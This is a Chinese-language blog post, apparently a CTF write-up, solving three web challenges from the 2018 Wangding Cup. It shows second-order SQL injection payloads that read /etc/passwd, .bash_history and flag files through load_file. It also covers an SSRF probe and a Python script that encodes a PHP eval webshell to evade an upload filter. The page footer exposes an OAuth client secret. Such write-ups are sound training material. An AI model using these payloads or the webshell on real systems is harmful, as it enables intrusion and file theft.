<!DOCTYPE html>
<html lang="zh-Hans">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">



  <meta name="description" content="2018网鼎杯第四场Web题解"/>




  <meta name="keywords" content="CTF, Mochazz's blog" />










  <link rel="alternate" href="/atom.xml" title="Mochazz's blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.10.1" />



<link rel="canonical" href="https://mochazz.github.io/2018/09/01/2018网鼎杯第四场/"/>



  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />




  <link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css" />



<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.10.1" />



  



  <script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>









<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true};
</script>

    <title> 2018网鼎杯第四场Web题解 - Mochazz's blog </title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Mochazz's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
      <a href="/">
        <li class="mobile-menu-item">
          
          
            首页
          
        </li>
      </a>
    
      <a href="/others/">
        <li class="mobile-menu-item">
          
          
            其他
          
        </li>
      </a>
    
  </ul>
</nav>

    <div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Mochazz's blog</a>
</div>

<nav class="site-navbar">
  
    <ul id="menu" class="menu">
      
        <li class="menu-item">
          <a class="menu-item-link" href="/">
            
            
              首页
            
          </a>
        </li>
      
        <li class="menu-item">
          <a class="menu-item-link" href="/others/">
            
            
              其他
            
          </a>
        </li>
      
    </ul>
  
</nav>

      </header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content">
            
  
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          2018网鼎杯第四场Web题解
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-01
        </span>
        
          <span class="post-category">
            
              <a href="/categories/CTF竞赛训练/">CTF竞赛训练</a>
            
          </span>
        
        
      </div>
    </header>

    
    
  <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">文章目录</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#comment"><span class="toc-text">comment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blog"><span class="toc-text">blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NoWafUpload"><span class="toc-text">NoWafUpload</span></a></li></ol></li></ol>
    </div>
  </div>



    <div class="post-content">
      
        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h3><p>题目界面如下，有发帖留言的功能，不过需要登录才能使用。</p>
<p><img src="/img/2018网鼎杯第四场/1.png" alt="1"></p>
<p>可以通过爆破得知账号密码为：zhangwei/zhangwei666</p>
<p><img src="/img/2018网鼎杯第四场/2.png" alt="2"></p>
<p>手工测试发现存在 <strong>.git</strong> 泄露，用 <a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener"><strong>GitHack</strong></a> 下载泄露文件，发现 <strong>write_do.php</strong> 的代码不全。通过 <strong>git cat-file -p xxxxx</strong> 命令显示版本库对象的内容、类型及大小信息，可以看到完整的代码：</p>
<p><img src="/img/2018网鼎杯第四场/3.png" alt="3"></p>
<p>具体代码如下：</p>
<p><img src="/img/2018网鼎杯第四场/4.png" alt="4"></p>
<p>可以看到上面 <strong>第13-14</strong> 行都对 <strong>POST</strong> 传来 <strong>category</strong> 、 <strong>title</strong> 、<strong>content</strong> 三个参数进行了特殊字符转义，然而在 <strong>第28行</strong> 和 <strong>第30-33行</strong> 处直接将从数据库中取出的数据，未经任何过滤拼接到 <strong>SQL语句</strong> 中，这就存在 <strong>二次注入</strong> 。</p>
<p>有很多人一直纠结 <strong>addslashes</strong> 这个转义函数，其实大家在数据库中测试一下就知道了，假设我们的 <strong>payload</strong> 为：<strong>‘,content=user(),/*</strong> ，那么经过 <strong>addslashes</strong> 函数转义后，变成了 <strong>\‘,content=user(),/*</strong> ，我们看一下插入数据库中变成啥样：</p>
<p><img src="/img/2018网鼎杯第四场/5.png" alt="5"></p>
<p>所以根本就不影响我们进行二次注入。下面说说二次注入的攻击过程：</p>
<ul>
<li>先进入 <strong>write</strong> 方法，将 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code> 插入 <strong>board</strong> 表的 <strong>category</strong> 字段中</li>
<li>再进入 <strong>comment</strong> 方法，程序将 <strong>board</strong> 表中的 <strong>category</strong> 字段取出，没进行过滤，拼接到新的 <strong>insert</strong> 语句中。由于我们之前的 <strong>payload</strong> 中带有 <strong>/*</strong> ，所以我们需要闭合它，即我们在评论处提交 <strong>*/#</strong> (对应 <strong>content</strong> 变量的值)</li>
<li>然后程序执行 <strong>第二个SQL</strong> 语句，并将用户提交的 <strong>content</strong> 值显示出来，而我们的 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code>  就会显示出当前用户。</li>
</ul>
<p><img src="/img/2018网鼎杯第四场/6.png" alt="6"></p>
<p><img src="/img/2018网鼎杯第四场/7.png" alt="7"></p>
<p>看到是 <strong>root</strong> 用户，一般 <strong>flag</strong> 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 <strong>SQL语句</strong> 读取flag文件了。</p>
<p>首先读取 <strong>/etc/passwd</strong> 看看服务器上有哪些用户，payload为: <strong>‘,content=(select load_file(‘/etc/passwd’)),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/8.png" alt="8"></p>
<p>发现存在 <strong>www</strong> 用户，继续查看 <strong>.bash_history</strong> 记录，payload为: <strong>‘,content=(select load_file(‘/home/www/.bash_history’)),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/9.png" alt="9"></p>
<p>发现 <strong>www</strong> 用户的一些操作。看见有 <strong>.DS_Store</strong> 文件，考虑到目标环境是docker，所以 <strong>.DS_Store</strong> 文件应该在 <strong>/tmp</strong> 中。而 <strong>.DS_Store</strong> 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： <strong>‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/10.png" alt="10"></p>
<p>解码获得flag路径：</p>
<p><img src="/img/2018网鼎杯第四场/11.png" alt="11"></p>
<p>使用payload： <strong>‘,content=(select load_file(‘/var/www/html/flag_8946e1ff1ee3e40f.php’)),/*</strong> 读取flag：</p>
<p><img src="/img/2018网鼎杯第四场/12.png" alt="12"></p>
<h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>没啥意思的一道题目。题目是一个wordpress的站点，如下：</p>
<p><img src="/img/2018网鼎杯第四场/13.png" alt="13"></p>
<p>查看图片的url，发现其url形式极其可能存在SSRF漏洞：</p>
<p><img src="/img/2018网鼎杯第四场/14.png" alt="14"></p>
<p>通过 <strong>git</strong> 收集信息，可以发现一个内网用户查询接口。</p>
<p><img src="/img/2018网鼎杯第四场/15.png" alt="15"></p>
<p><img src="/img/2018网鼎杯第四场/16.png" alt="16"></p>
<p><strong>api.php</strong> 的内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//http://10.220.56.29/WD_UserListAPI.php?uid=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以我们遍历uid的值即可获取用户信息。当uid值为233的时候，即可获得flag：</p>
<p><img src="/img/2018网鼎杯第四场/17.png" alt="17"></p>
<h3 id="NoWafUpload"><a href="#NoWafUpload" class="headerlink" title="NoWafUpload"></a>NoWafUpload</h3><p>这题可以任意上传文件，题目如下：</p>
<p><img src="/img/2018网鼎杯第四场/18.png" alt="18"></p>
<p>当我们上传PHP一句话的时候，显示上传成功并返回路径，但是去访问就404。</p>
<p><img src="/img/2018网鼎杯第四场/19.png" alt="19"></p>
<p>一开始以为是时间竞争，尝试发现并不是。扫了一下目录，发现存在 <strong><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></strong> 文件，里面包含一个.so的拓展还有一个经过加密的PHP文件。所以考点应该是我们通过逆向来知道加密算法，然后将我们的一句话经过该加密算法加密后再上传，这样代码通过检测才能被解析。使用 <strong>IDA</strong> 反汇编 <strong>funencrypt.so</strong> 文件，发现关键函数，代码如下：</p>
<p><img src="/img/2018网鼎杯第四场/21.png" alt="21"></p>
<p>我们把经过加密的 <strong>sdfasgerwtytc.php</strong> 文件拖入16进制分析软件中，并根据上面的反汇编代码进行对比：</p>
<p><img src="/img/2018网鼎杯第四场/22.png" alt="22"></p>
<p> <strong>sdfasgerwtytc.php</strong> 文件实际上就是一个 <strong>phpinfo</strong> 页面（上传上去访问就知道了），而上图中的的三个 <strong>fread</strong> 代码分别表示前32字节的字符串（这里刚好是一个md5值）、两个长度。一个为16进制 <strong>10</strong> ，即整数16，猜测是代码： <strong>&lt;?php phpinfo();</strong> 的长度，后面一个为16进制16，即整数22，刚好是后面一段乱七八糟字符串的长度。</p>
<p>我们继续看35行以下的代码。首先先校验了开头读的md5，而这个md5的值就是后面那一串乱七八糟字符串的md5，这个自己计算一下就知道了。然后取那串乱七八糟的字符串逐位与 <strong>0xC</strong> 进行异或，并将其结果 <strong>uncompress</strong> 后写入某个文件。</p>
<p><img src="/img/2018网鼎杯第四场/23.png" alt="23"></p>
<p>根据上面的逻辑，反推回去，写出加密PHP程序的代码。如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,zlib</span><br><span class="line">s = <span class="string">"&lt;?php eval($_POST[_]);"</span></span><br><span class="line">bf_len = hex(len(s))</span><br><span class="line"></span><br><span class="line">compress_s = zlib.compress(s)</span><br><span class="line"></span><br><span class="line">new_compress = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> compress_s:</span><br><span class="line">    new_compress += chr(ord(ch)^<span class="number">0xC</span>)</span><br><span class="line"></span><br><span class="line">MD5 = hashlib.md5()</span><br><span class="line">MD5.update(new_compress)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"MD5 : "</span> + MD5.hexdigest().encode(<span class="string">'hex'</span>))</span><br><span class="line">print(<span class="string">"bf_len: "</span> + bf_len)</span><br><span class="line">af_len = hex(len(new_compress))</span><br><span class="line">print(<span class="string">"af_len: "</span> + af_len)</span><br><span class="line">print(<span class="string">"new_compress: "</span> + new_compress.encode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
<p>将生成的16进制数据按顺序写入文件即可：</p>
<p><img src="/img/2018网鼎杯第四场/24.png" alt="24"></p>
<p>上传该文件，使用密码 <strong>_</strong> 查找flag：</p>
<p><img src="/img/2018网鼎杯第四场/25.png" alt="25"></p>

      
    </div>

    
      
      

  <div class="post-copyright">
    <p class="copyright-item">
      <span>原文作者: </span>
      <a href="https://mochazz.github.io">Mochazz</a>
    </p>
    <p class="copyright-item">
      <span>原文链接: </span>
      <a href="https://mochazz.github.io/2018/09/01/2018网鼎杯第四场/">https://mochazz.github.io/2018/09/01/2018网鼎杯第四场/</a>
    </p>
    <p class="copyright-item">
      <span>许可协议: </span>
      
      <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>



      
      
    

    
      <footer class="post-footer">
        
          <div class="post-tags">
            
              <a href="/tags/CTF/">CTF</a>
            
          </div>
        
        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2018/09/10/关于ECShop前台注入和getshell漏洞的一些思考/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">关于ECShop前台注入和getshell漏洞的一些思考</span>
        <span class="prev-text nav-mobile">上一篇</span>
      </a>
    
    
      <a class="next" href="/2018/08/31/代码审计Day10 - 程序未恰当exit导致的问题/">
        <span class="next-text nav-default">代码审计Day10 - 程序未恰当exit导致的问题</span>
        <span class="prev-text nav-mobile">下一篇</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>


      </footer>
    

  </article>


          </div>
          
  <div class="comments" id="comments">
    
    <div id="container"></div>
    <link rel="stylesheet" href="/css/gitcomment_default.css">
    <script src="/js/src/gitment.browser.js"></script>
    <script>
    var gitment = new Gitment({
      id: 'location.href',
      title: 'document.title',
      link: 'location.href',
      owner: 'mochazz',
      repo: 'mochazz.github.io',
      oauth: {
        client_id: 'ec67086aeb5a28187ea5',
        client_secret: 'ba659d44ebd34e7d84d4ebfca561e8f3a30b2678',
      },
    })
    gitment.render('container')
    </script>
  </div>

        </div>
      </main>

      <footer id="footer" class="footer">

  <div class="social-links">
    
      
        
          <a href="mailto:379032449@qq.com" class="iconfont icon-email" title="email"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
        
          <a href="https://github.com/Mochazz/" class="iconfont icon-github" title="github"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    

    
  </div>



<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">
    
    &copy; 
     
      2017 - 
    
    2018

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Mochazz</span>
  </span>
</div>
      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>

    
  
  

  



    
  



  
  





  
    <script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  

  
    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  

  
    <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
  


    <script type="text/javascript" src="/js/src/even.js?v=2.10.1"></script>

  </body>
</html>
